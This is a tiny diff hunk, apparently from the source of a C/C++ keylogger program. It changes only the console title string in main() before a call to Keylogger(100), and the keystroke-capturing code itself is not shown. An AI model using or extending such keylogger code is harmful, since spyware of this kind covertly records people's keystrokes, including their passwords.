@@ -205,6 +205,6 @@ void Keylogger(int delai) {
 
 int main()
 {
-	system(" title Keylogger!");
+	system("title Keylogger");
 	Keylogger(100);
 }
